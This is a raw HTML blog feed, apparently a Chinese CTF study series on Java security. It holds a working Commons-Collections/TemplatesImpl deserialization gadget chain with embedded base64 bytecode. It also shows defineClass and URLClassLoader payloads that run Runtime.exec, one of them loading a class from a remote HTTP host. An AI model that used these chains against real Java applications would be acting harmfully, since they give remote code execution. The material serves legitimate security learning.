class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;feng&quot;</span>);</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] trueTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;feng1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;feng2&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;feng1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,trueTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(expMap);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈</li><li>还是信工所大佬</li><li><a href="https://github.com/phith0n/JavaThings/tree/master/general/src/main/java/com/govuln/deserialization">p牛的poc</a></li><li><a href="https://www.anquanke.com/post/id/261724">还挺不错的文章</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全3(2)_常用加载方法</title>
      <link href="/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/"/>
      <url>/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><h3 id="ClassLoader快速复习"><a href="#ClassLoader快速复习" class="headerlink" title="ClassLoader快速复习"></a>ClassLoader快速复习</h3><ol><li>类加载器 ClassLoader 是实现类加载机制的一个重要组成部分，负责将类文件加载到内存中并转换为可执行的 Java 类。<code>java.lang.ClassLoader</code>是所有类加载器的父类，在其中有三个关键方法：<ol><li><code>loadClass(String name, boolean resolve)</code>：该方法用于加载类，并根据 resolve 参数决定是否解析该类，如果 resolve 为 true，则在加载类的同时，也会解析该类的依赖项。</li><li><code>findClass(String name)</code>：该方法用于查找并加载指定名称的类。</li><li><code>defineClass(String name, byte[] b, int off, int len)</code>：该方法将一个字节数组表示的类定义转换为一个 Class 对象，用于将类的字节码转换为 Class 对象。</li></ol></li><li>操作本地类的字节码(本地文件中的java字节码放置.class文件中)<ol><li><p><strong>编译成字节码</strong>：<code>javac HelloWorld.java</code>，使用当前配置的java版本进行编译，不同java版本可能不能公用字节码</p><blockquote><p>报错关键字: major version<br>每个Java版本都有其特定的类文件格式版本号（major.minor version）。例如：<br>Java 7: 51.0<br>Java 8: 52.0<br>Java 9: 53.0<br>Java 10: 54.0</p></blockquote></li><li><p><strong>反汇编class文件以查看字节码</strong>：<code>javap -c -p -l HelloWorld.class</code></p></li><li><p><strong>查看class文件二进制内容</strong>：可以使用<code>xxd HelloWorld.class</code>来查看</p></li></ol></li></ol><h3 id="defineClass加载恶意类"><a href="#defineClass加载恶意类" class="headerlink" title="defineClass加载恶意类"></a>defineClass加载恶意类</h3><blockquote><ol><li>注意到: Class.forName(“类名”)默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用Class.forName(“类名”, 是否初始化类, 类加载器)，而ClassLoader.loadClass默认不会初始化类方法 –&gt; 即使是static{}里的代码也不会执行</li><li>使用base64编码获取.class的字节码<code>cat TestClass.class | base64</code>并结合Byte[]数组可以直接加载类</li></ol></blockquote><ol><li>这里的恶意类ClassLoaderPayload不要带 package 包名</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ClassLoaderPayload.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassLoaderPayload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoaderRCE.java</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">defineMehtod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            defineMehtod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// javac ClassLoaderPayload.java &amp;&amp; cat ClassLoaderPayload.class | base64</span></span><br><span class="line">            <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHABkHABcBAApTb3VyY2VG&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;aWxlAQAXQ2xhc3NMb2FkZXJQYXlsb2FkLmphdmEMAAkACgcAGwwAHAAdAQAEY2FsYwwAHgAfAQAT&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;amF2YS9sYW5nL0V4Y2VwdGlvbgwAIAAKAQASQ2xhc3NMb2FkZXJQYXlsb2FkAQAQamF2YS9sYW5n&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;L09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9S&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;dW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsB&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;AA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAEAAQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgA&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;AhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAMAAAAGgAGAAAAAgAEAAQADQAHABAABQARAAYA&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;FQAIAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAAAAACABE=&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> (Class) defineMehtod.invoke(ClassLoader.getSystemClassLoader(), code , <span class="number">0</span>, code.length);</span><br><span class="line">            p.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><h3 id="什么是URLClassLoader"><a href="#什么是URLClassLoader" class="headerlink" title="什么是URLClassLoader"></a>什么是URLClassLoader</h3><ol><li><p>看看源码和大佬的博客</p><ol><li>翻译1：对应的URL有&#x2F;的就当作目录，没有&#x2F;的就当作jar文件处理</li><li>翻译2：创建 URLClassLoader 实例的线程的 AccessControlContext 将在随后加载类和资源时使用</li><li>翻译3：默认情况下，加载的类仅被授予访问创建 URLClassLoader 时指定的 URL 的权限</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This class loader is used to load classes and resources from a search</span></span><br><span class="line"><span class="comment"> * path of URLs referring to both JAR files and directories. Any URL that</span></span><br><span class="line"><span class="comment"> * ends with a &#x27;/&#x27; is assumed to refer to a directory. Otherwise, the URL</span></span><br><span class="line"><span class="comment"> * is assumed to refer to a JAR file which will be opened as needed.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The AccessControlContext of the thread that created the instance of</span></span><br><span class="line"><span class="comment"> * URLClassLoader will be used when subsequently loading classes and</span></span><br><span class="line"><span class="comment"> * resources.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The classes that are loaded are by default granted permission only to</span></span><br><span class="line"><span class="comment"> * access the URLs specified when the URLClassLoader was created.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  David Connelly</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoader</span> <span class="keyword">extends</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>URLClassLoader 实际上是我们<strong>平时默认使用的 AppClassLoader 的父类</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Launcher</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AppClassLoader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是<strong>经过处理后的java.net.URL类</strong>）来寻找.class文件来加载</li><li>基础路径有分为三种情况<ol><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻</li><li>找.class文件URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 –&gt; 比如<code>http</code>等远程协议时，涉及到一个问题**Java的URL究竟支持哪些协议?**，后面再来</li></ol></li></ol></li><li><p><em><strong>工作原理</strong></em>: 对远程功能的添加在于重写<code>@Override: findClass()</code>这个方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关于构造函数，这里主要是看到ucp就是我们传入的url的处理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">URLClassLoader(URL[] urls, AccessControlContext acc) &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">        security.checkCreateClassLoader();</span><br><span class="line">    &#125;</span><br><span class="line">    ucp = <span class="keyword">new</span> <span class="title class_">URLClassPath</span>(urls);</span><br><span class="line">    <span class="built_in">this</span>.acc = acc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 我的说明：逻辑就不细讲了，但是可以看到在findClass()中处理的ucp就是从外部传入的那个路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name)</span><br><span class="line">     <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Class&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Class <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                    <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> ucp.getResource(path, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, acc);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (ClassNotFoundException) pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="URLClassLoader加载远程class"><a href="#URLClassLoader加载远程class" class="headerlink" title="URLClassLoader加载远程class"></a>URLClassLoader加载远程class</h3><ol><li><strong>服务器问题</strong>: <code>python -m http.server --bind 127.0.0.1 9999</code>本地文件夹运行python服务器，可以通过<code>127.0.0.1</code>或者 <code>ipconfig</code> 出来的ipv4地址，注意编译class文件的java版本</li><li><strong>远程加载问题</strong>: 部署的要通过URLClassLoader来加载远程服务，由于<strong>双亲委派</strong>模型，导致这里在 loadClass 方法会优先从本地找起，所以需要将编译后的 <code>恶意类.class</code> 放置在项目之外的目录，不然就会找到本地的</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URLClassLoaderPayload.java   放在加载文件的项目文件外</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoaderPayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">URLClassLoaderPayload</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// URLClassLoaderRCE.java   用于加载远程恶意文件</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoaderRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://192.168.10.126:9999/&quot;</span>);</span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">my_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> my_loader.loadClass(<span class="string">&quot;URLClassLoaderPayload&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (Process) clazz.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(<span class="literal">null</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="defineClass-调用链"><a href="#defineClass-调用链" class="headerlink" title="defineClass()调用链"></a>defineClass()调用链</h2><h3 id="细嗦缘由"><a href="#细嗦缘由" class="headerlink" title="细嗦缘由"></a>细嗦缘由</h3><ol><li>通过 defineClass 直接加载字节码时，由于 defineClass 方法的<strong>访问修饰符为 protected</strong>，不得不使用到反射技术才得以利用，这使得 defineClass 在实战利用中没法被直接利用，不过也提到了存在一些间接路线能够对 defineClass 进行间接调用</li><li>这里的间接路线也是类似于java反序列化的链条进行调用的，所以也是调用链</li></ol><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><h4 id="什么是TemplatesImpl"><a href="#什么是TemplatesImpl" class="headerlink" title="什么是TemplatesImpl?"></a>什么是TemplatesImpl?</h4><blockquote><p>TemplatesImpl 便是间接路线之一<br>TemplatesImpl 在后续的多个反序列化链及实际场景中都会有所体现，如 CommonsCollections2、CommonsCollections3、CommonsCollections4、CommonsBeanutils1、Shiro 反序列化利用和 Fastjson 反序列化利用等</p></blockquote><ol><li><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类的作用是表示 XSLT 模板，它可以解析 XSLT 样式表并将其编译成可重用的模板。XSLT 是一种 XML 风格语言，<strong>用于将 XML 文档转换为其他格式，比如 HTML、文本或其他 XML 文档</strong></p><ol><li>它是 javax.xml.transform.Templates 接口的具体实现</li><li>可以进行序列化</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h4><ol><li><p>调用链式倒推的，首先看到寻找TemplatesImpl中可供defindeClass()方法，在内部静态类<code>TransletClassLoader</code>中</p><ol><li>注意到此处的defineClass()方法的访问属性式default，即可以被同一个包的访问到，这个静态类继承了ClassLoader</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    